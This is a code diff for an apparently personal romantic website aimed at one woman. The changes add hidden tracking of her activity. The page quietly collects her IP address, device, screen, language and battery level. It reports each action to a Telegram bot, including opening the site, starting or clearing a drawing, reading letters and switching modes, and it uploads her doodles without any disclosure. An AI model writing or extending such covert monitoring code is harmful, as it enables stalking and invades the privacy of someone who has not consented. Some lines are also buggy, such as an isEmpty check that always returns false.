@@ -47,26 +47,59 @@ const CONFIG = {
   },
 };
 
-// ================= VISIT NOTIFIER =================
-const VisitNotifier = {
-  init() {
-    const lastVisit = sessionStorage.getItem("lastVisit");
-    if (!lastVisit) {
-      sessionStorage.setItem("lastVisit", Date.now());
-      this.sendAlert();
+// ================= USER INFO & LOGGING =================
+const UserInfo = {
+  data: {
+    ip: "Loading...",
+    device: "Unknown",
+    platform: navigator.platform || "Unknown",
+    screen: `${window.innerWidth}x${window.innerHeight}`,
+    lang: navigator.language || "en",
+    userAgent: navigator.userAgent,
+    battery: "Unknown",
+  },
+
+  async init() {
+    this.parseDevice();
+    this.getBattery();
+    await this.fetchIP();
+    return this.data;
+  },
+
+  parseDevice() {
+    const ua = navigator.userAgent;
+    if (ua.match(/iPhone/i)) this.data.device = "iPhone";
+    else if (ua.match(/iPad/i)) this.data.device = "iPad";
+    else if (ua.match(/Android/i)) this.data.device = "Android";
+    else if (ua.match(/Mac/i)) this.data.device = "Mac";
+    else if (ua.match(/Win/i)) this.data.device = "Windows";
+    else if (ua.match(/Linux/i)) this.data.device = "Linux"; // Added Linux
+    else this.data.device = "Other";
+  },
+
+  async fetchIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const json = await res.json();
+      this.data.ip = json.ip;
+    } catch (e) {
+      this.data.ip = "Failed to get IP";
     }
   },
 
-  sendAlert() {
-    const { userAgent } = navigator;
-    let device = "Unknown Device";
-    if (userAgent.match(/iPhone/i)) device = "iPhone";
-    else if (userAgent.match(/iPad/i)) device = "iPad";
-    else if (userAgent.match(/Android/i)) device = "Android";
-    else if (userAgent.match(/Mac/i)) device = "Mac";
-    else if (userAgent.match(/Win/i)) device = "Windows";
+  async getBattery() {
+    if ("getBattery" in navigator) {
+      try {
+        const bat = await navigator.getBattery();
+        this.data.battery = `${Math.round(bat.level * 100)}%${
+          bat.charging ? " ⚡" : ""
+        }`;
+      } catch (e) {}
+    }
+  },
 
-    Notifier.sendTelegram(`🚨 She opened the site! \n📱 Device: ${device}`);
+  getSignature() {
+    return `\n\n📌 <b>Info:</b>\n📱 ${this.data.device} | 🔋 ${this.data.battery}\n🌐 ${this.data.ip}\n🖥️ ${this.data.screen}`;
   },
 };
 
@@ -276,15 +309,22 @@ class Chaser {
 }
 
 // ================= NOTIFICATIONS =================
-// Simple wrapper to handle permission logic
 const Notifier = {
   lastHer: null,
   lastHim: null,
   lastSelfAction: 0,
 
-  init() {
-    if ("Notification" in window && Notification.permission === "default") {
-      // Can't request on load, must be user action.
+  async init() {
+    await UserInfo.init();
+
+    // Visit Alert (Only once per session)
+    const lastVisit = sessionStorage.getItem("lastVisit");
+    if (!lastVisit) {
+      sessionStorage.setItem("lastVisit", Date.now());
+      this.sendTelegram(`🚨 <b>SHE OPENED THE SITE!</b> 🚨`);
+    } else {
+      // Just log a return visit silently or with a smaller alert
+      // this.sendTelegram(`👀 She's back!`);
     }
   },
 
@@ -295,11 +335,19 @@ const Notifier = {
   },
 
   sendTelegram(text) {
+    // Append Info & Timestamp
+    const time = new Date().toLocaleTimeString("en-US", {
+      hour12: true,
+      hour: "numeric",
+      minute: "2-digit",
+    });
+    const fullText = `[${time}] ${text}` + UserInfo.getSignature();
+
     const url = `https://api.telegram.org/bot${
       CONFIG.telegram.token
-    }/sendMessage?chat_id=${CONFIG.telegram.chatId}&text=${encodeURIComponent(
-      text
-    )}`;
+    }/sendMessage?chat_id=${
+      CONFIG.telegram.chatId
+    }&parse_mode=HTML&text=${encodeURIComponent(fullText)}`;
     fetch(url, { mode: "no-cors" }).catch((e) => console.error("TG Fail", e));
   },
 
@@ -319,6 +367,36 @@ const Notifier = {
 
     if (type === "her") this.lastHer = val;
     else this.lastHim = val;
+  },
+
+  async sendPhoto(blob, caption) {
+    const formData = new FormData();
+    formData.append("chat_id", CONFIG.telegram.chatId);
+    formData.append("photo", blob, "doodle.png");
+
+    // Add time to caption
+    const time = new Date().toLocaleTimeString("en-US", {
+      hour12: true,
+      hour: "numeric",
+      minute: "2-digit",
+    });
+    if (caption) {
+      // Change ** to <b> for Telegram HTML mode if user uses markdown style
+      caption = caption.replace(/\*\*(.*?)\*\*/g, "<b>$1</b>");
+      formData.append(
+        "caption",
+        `[${time}] ${caption}` + UserInfo.getSignature()
+      );
+      formData.append("parse_mode", "HTML");
+    }
+
+    const url = `https://api.telegram.org/bot${CONFIG.telegram.token}/sendPhoto`;
+
+    try {
+      await fetch(url, { method: "POST", body: formData });
+    } catch (e) {
+      console.error("TG Photo Fail", e);
+    }
   },
 };
 
@@ -342,6 +420,24 @@ const ui = {
   guestbook: {
     input: document.getElementById("guestbookInput"),
     send: document.getElementById("sendNoteBtn"),
+    clear: document.getElementById("clearDoodle"),
+
+    // New Elements
+    overlay: document.getElementById("doodleOverlay"),
+    toolbar: document.getElementById("doodleToolbar"),
+    toggleTools: document.getElementById("toggleTools"),
+    launcher: document.getElementById("doodleLauncher"),
+    thumb: document.getElementById("doodleThumbnail"),
+    done: document.getElementById("doneDoodle"),
+    delDraft: document.getElementById("btnDeleteDoodle"),
+    editDraft: document.getElementById("btnEditDoodle"),
+
+    // Tools
+    penColor: document.getElementById("penColor"),
+    bgColor: document.getElementById("bgColor"),
+    plus: document.getElementById("sizePlus"),
+    minus: document.getElementById("sizeMinus"),
+    presets: document.querySelectorAll(".color-preset"),
   },
   btns: {
     him: document.getElementById("sendToHimBtn"),
@@ -382,6 +478,169 @@ const ui = {
 // const sound = new SoundManager(); // Removed
 const particles = new ParticleSystem("particles");
 const chaser = new Chaser(document.getElementById("chaser"), particles);
+
+// ================= DOODLE BOARD =================
+// ================= DOODLE BOARD =================
+class DoodleBoard {
+  constructor(canvasId) {
+    this.canvas = document.getElementById(canvasId);
+    this.ctx = this.canvas.getContext("2d");
+    this.isDrawing = false;
+    this.hasLoggedStart = false; // New Log flag
+    this.bgColor = "#ffffff";
+    this.penColor = "#e91e63";
+    this.lineWidth = 5;
+
+    // Use CSS for visual background (instant change)
+    this.canvas.style.backgroundColor = this.bgColor;
+
+    this.setupEvents();
+    // Delay slightly to ensure layout is ready
+    setTimeout(() => this.resize(280, 150, true), 50);
+  }
+
+  setupEvents() {
+    // Mouse
+    this.canvas.addEventListener("mousedown", (e) =>
+      this.start(e.offsetX, e.offsetY)
+    );
+    this.canvas.addEventListener("mousemove", (e) =>
+      this.move(e.offsetX, e.offsetY)
+    );
+    this.canvas.addEventListener("mouseup", () => this.end());
+    this.canvas.addEventListener("mouseout", () => this.end());
+
+    // Touch
+    this.canvas.addEventListener("touchstart", (e) => {
+      // Touch action handled in CSS
+      const pos = this.getTouchPos(e);
+      this.start(pos.x, pos.y);
+    });
+    this.canvas.addEventListener("touchmove", (e) => {
+      if (e.cancelable) e.preventDefault();
+      const pos = this.getTouchPos(e);
+      this.move(pos.x, pos.y);
+    });
+    this.canvas.addEventListener("touchend", () => this.end());
+  }
+
+  resize(w, h, force = false) {
+    if (
+      !force &&
+      this.canvas.clientWidth === w &&
+      this.canvas.clientHeight === h
+    )
+      return;
+
+    // 1. Save Content (Transparent)
+    const temp = document.createElement("canvas");
+    temp.width = this.canvas.width;
+    temp.height = this.canvas.height;
+    temp.getContext("2d").drawImage(this.canvas, 0, 0);
+
+    // 2. Handle DPI (High Resolution)
+    const dpr = window.devicePixelRatio || 1;
+    this.canvas.width = w * dpr;
+    this.canvas.height = h * dpr;
+
+    // Style matches logical size
+    this.canvas.style.width = `${w}px`;
+    this.canvas.style.height = `${h}px`;
+
+    // Scale context
+    this.ctx.scale(dpr, dpr);
+
+    // 3. Restore Config
+    this.ctx.lineCap = "round";
+    this.ctx.lineJoin = "round";
+    this.ctx.lineWidth = this.lineWidth;
+    this.ctx.strokeStyle = this.penColor;
+
+    // 4. Restore Content (Scaled)
+    this.ctx.drawImage(temp, 0, 0, w, h);
+  }
+
+  getTouchPos(e) {
+    const rect = this.canvas.getBoundingClientRect();
+    return {
+      x: e.touches[0].clientX - rect.left,
+      y: e.touches[0].clientY - rect.top,
+    };
+  }
+
+  start(x, y) {
+    this.isDrawing = true;
+
+    // Log start of drawing (once per session)
+    if (!this.hasLoggedStart) {
+      this.hasLoggedStart = true;
+      Notifier.sendTelegram("✏️ She started drawing...");
+    }
+
+    this.ctx.beginPath();
+    this.ctx.moveTo(x, y);
+  }
+
+  move(x, y) {
+    if (!this.isDrawing) return;
+    this.ctx.lineTo(x, y);
+    this.ctx.stroke();
+  }
+
+  end() {
+    this.isDrawing = false;
+  }
+
+  setColor(c) {
+    this.penColor = c;
+    this.ctx.strokeStyle = c;
+  }
+
+  setBg(c) {
+    this.bgColor = c;
+    this.canvas.style.backgroundColor = c;
+  }
+
+  changeSize(delta) {
+    // 2 to 20 range
+    this.lineWidth = Math.max(2, Math.min(20, this.lineWidth + delta));
+    this.ctx.lineWidth = this.lineWidth;
+
+    // Show temporary feedback (optional, but requested implicitly by 'visually more appearing')
+    showFloatingAnim(`Size: ${this.lineWidth}`, this.penColor);
+  }
+
+  clear() {
+    // Clear transparent canvas
+    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height); // Note: cleared in raw pixels
+    this.hasLoggedStart = false; // Reset log on clear
+    Notifier.sendTelegram("🗑️ She cleared her drawing");
+  }
+
+  async exportImage() {
+    // Composite for Send
+    const exp = document.createElement("canvas");
+    exp.width = this.canvas.width;
+    exp.height = this.canvas.height;
+    const xCtx = exp.getContext("2d");
+
+    // Fill BG color
+    xCtx.fillStyle = this.bgColor;
+    xCtx.fillRect(0, 0, exp.width, exp.height);
+
+    // Draw content
+    xCtx.drawImage(this.canvas, 0, 0);
+
+    return new Promise((resolve) => {
+      exp.toBlob((blob) => resolve({ blob, url: exp.toDataURL("image/png") }));
+    });
+  }
+
+  isEmpty() {
+    return false;
+  }
+}
+const doodle = new DoodleBoard("doodleCanvas");
 
 // --- SETUP ---
 
@@ -429,12 +688,202 @@ if (CONFIG.messages.base) {
 }
 
 // Visit Notification
-VisitNotifier.init();
+Notifier.init();
 
 // Guestbook Logic
-ui.guestbook.send.addEventListener("click", () => {
+ui.guestbook.clear.addEventListener("click", () => {
+  if (doodle.isEmpty()) return;
+  if (confirm("Are you sure you want to clear your drawing? 🗑️")) {
+    doodle.clear();
+  }
+});
+
+// Toggle Toolbar & Draggable Logic
+if (ui.guestbook.toolbar && ui.guestbook.toggleTools) {
+  const el = ui.guestbook.toolbar;
+  let isDragging = false;
+  let startX, startY;
+  let initialLeft, initialTop;
+  let hasMoved = false;
+
+  const onStart = (e) => {
+    // Only drag if minimized
+    if (!el.classList.contains("minimized")) return;
+
+    isDragging = true;
+    hasMoved = false;
+
+    // Get client coordinates
+    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+
+    startX = clientX;
+    startY = clientY;
+
+    // Get current position
+    const rect = el.getBoundingClientRect();
+    initialLeft = rect.left;
+    initialTop = rect.top;
+
+    // Ensure we are in absolute positioning mode for dragging
+    el.style.left = initialLeft + "px";
+    el.style.top = initialTop + "px";
+    el.style.transform = "none";
+
+    e.preventDefault(); // Stop scrolling
+  };
+
+  const onMove = (e) => {
+    if (!isDragging) return;
+
+    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+
+    const dx = clientX - startX;
+    const dy = clientY - startY;
+
+    if (Math.abs(dx) > 5 || Math.abs(dy) > 5) hasMoved = true;
+
+    let newLeft = initialLeft + dx;
+    let newTop = initialTop + dy;
+
+    // Boundary Constraints
+    const maxLeft = window.innerWidth - el.offsetWidth;
+    const maxTop = window.innerHeight - el.offsetHeight;
+
+    newLeft = Math.max(0, Math.min(maxLeft, newLeft));
+    newTop = Math.max(0, Math.min(maxTop, newTop));
+
+    el.style.left = newLeft + "px";
+    el.style.top = newTop + "px";
+  };
+
+  const onEnd = () => {
+    if (!isDragging) return;
+    isDragging = false;
+
+    // If it was just a click (little movement), toggle
+    if (!hasMoved) {
+      toggleToolbar();
+    }
+  };
+
+  // Attach events
+  el.addEventListener("mousedown", onStart);
+  document.addEventListener("mousemove", onMove);
+  document.addEventListener("mouseup", onEnd);
+
+  el.addEventListener("touchstart", onStart, { passive: false });
+  document.addEventListener("touchmove", onMove, { passive: false });
+  document.addEventListener("touchend", onEnd);
+
+  // Toggle Function
+  function toggleToolbar() {
+    el.classList.toggle("minimized");
+    const isMin = el.classList.contains("minimized");
+    ui.guestbook.toggleTools.textContent = isMin ? "🎨" : "🔽";
+
+    // Reset Position when expanding
+    if (!isMin) {
+      el.style.left = "50%";
+      el.style.top = "max(20px, env(safe-area-inset-top))";
+      el.style.transform = "translateX(-50%)";
+    }
+  }
+
+  // Bind click on toggle button (for when expanded)
+  ui.guestbook.toggleTools.addEventListener("click", (e) => {
+    if (!el.classList.contains("minimized")) {
+      toggleToolbar();
+      e.stopPropagation();
+      Notifier.sendTelegram("🎨 She minimized the toolbar");
+    }
+  });
+}
+
+const openEditor = () => {
+  ui.guestbook.overlay.classList.add("visible");
+  doodle.hasLoggedStart = false; // Reset log flag
+  Notifier.sendTelegram("🎨 she opened the Doodle Editor");
+
+  // Ensure toolbar is visible (not minimized) when opening
+  if (ui.guestbook.toolbar) {
+    ui.guestbook.toolbar.classList.remove("minimized");
+    ui.guestbook.toolbar.style.left = "50%";
+    ui.guestbook.toolbar.style.top = "max(20px, env(safe-area-inset-top))";
+    ui.guestbook.toolbar.style.transform = "translateX(-50%)";
+
+    if (ui.guestbook.toggleTools) ui.guestbook.toggleTools.textContent = "🔽";
+  }
+  doodle.resize(window.innerWidth, window.innerHeight, true);
+};
+
+// Launch Editor (Tap to Draw)
+if (ui.guestbook.launcher) {
+  ui.guestbook.launcher.addEventListener("click", (e) => {
+    // Did we click the delete button?
+    if (e.target.closest("#btnDeleteDoodle")) return;
+
+    openEditor();
+  });
+}
+// Edit Button (Explicit)
+if (ui.guestbook.editDraft) {
+  ui.guestbook.editDraft.addEventListener("click", (e) => {
+    e.stopPropagation();
+    openEditor();
+  });
+}
+
+// Delete Draft
+if (ui.guestbook.delDraft) {
+  ui.guestbook.delDraft.addEventListener("click", (e) => {
+    e.stopPropagation();
+    if (confirm("Delete this doodle? 🗑️")) {
+      doodle.clear();
+      ui.guestbook.thumb.classList.remove("visible");
+      // Launcher controls will auto-hide via CSS
+      Notifier.sendTelegram("🗑️ She deleted her doodle draft");
+    }
+  });
+}
+
+// Close Editor (Done)
+if (ui.guestbook.done) {
+  ui.guestbook.done.addEventListener("click", async () => {
+    ui.guestbook.overlay.classList.remove("visible");
+    Notifier.sendTelegram("✅ She closed the Drawing Editor");
+    const { url } = await doodle.exportImage();
+    ui.guestbook.thumb.src = url;
+    ui.guestbook.thumb.classList.add("visible");
+  });
+}
+
+// Controls
+if (ui.guestbook.penColor) {
+  ui.guestbook.penColor.addEventListener("change", (e) =>
+    doodle.setColor(e.target.value)
+  );
+  ui.guestbook.bgColor.addEventListener("change", (e) =>
+    doodle.setBg(e.target.value)
+  );
+  ui.guestbook.presets.forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const c = btn.getAttribute("data-color");
+      doodle.setColor(c);
+      ui.guestbook.penColor.value = c;
+    });
+  });
+
+  if (ui.guestbook.plus)
+    ui.guestbook.plus.addEventListener("click", () => doodle.changeSize(2));
+  if (ui.guestbook.minus)
+    ui.guestbook.minus.addEventListener("click", () => doodle.changeSize(-2));
+}
+
+ui.guestbook.send.addEventListener("click", async () => {
   const msg = ui.guestbook.input.value.trim();
-  if (!msg) return;
+  const hasDoodle = ui.guestbook.thumb.classList.contains("visible");
 
   // Optimistic UI
   ui.guestbook.input.value = "";
@@ -442,17 +891,33 @@ ui.guestbook.send.addEventListener("click", () => {
   box.classList.remove("visible");
   box.setAttribute("aria-hidden", "true");
 
+  // Hide Thumbnail
+  ui.guestbook.thumb.classList.remove("visible");
+
   showFloatingAnim("Sent!", "#a855f7");
   particles.spawnBatch("📝", 8);
 
-  // Send to Firebase
-  push(ref(db, "guestbook"), {
-    text: msg,
-    timestamp: Date.now(),
-  });
+  const timestamp = Date.now();
+  let imageUrl = null;
 
-  // Notify Telegram
-  Notifier.sendTelegram(`📝 **New Guestbook Message:**\n"${msg}"`);
+  if (hasDoodle) {
+    const { blob, url } = await doodle.exportImage();
+    imageUrl = url;
+    Notifier.sendPhoto(blob, msg ? `📝 Note: ${msg}` : "🎨 A doodle for you!");
+    doodle.clear();
+  } else if (msg) {
+    Notifier.sendTelegram(`📝 **New Message:**\n"${msg}"`);
+  }
+
+  // Save to Firebase
+  if (msg || imageUrl) {
+    push(ref(db, "guestbook"), {
+      text: msg,
+      image: imageUrl,
+      sentToTelegram: false,
+      timestamp,
+    });
+  }
 });
 
 // Letters Logic
@@ -464,7 +929,7 @@ document.querySelectorAll(".mood-btn").forEach((btn) => {
       ui.letterView.content.textContent = text;
       ui.letterView.box.classList.add("visible");
       document.getElementById("lettersBox").classList.remove("visible"); // Close menu
-      Notifier.sendTelegram(`💌 **She is reading:** ${mood}`);
+      Notifier.sendTelegram(`💌 shee is reading:** ${mood}`);
     }
   });
 });
@@ -539,7 +1004,7 @@ ui.btns.threeAm.addEventListener("click", (e) => {
   e.stopPropagation();
   chaser.setMode("3am");
   highlightBtn(ui.btns.threeAm);
-  Notifier.sendTelegram("😈 **She switched to 3 A.M. Mode!**");
+  Notifier.sendTelegram("😈 shee switched to 3 A.M. Mode!**");
 });
 ui.btns.hearts.addEventListener("click", (e) => {
   e.stopPropagation();
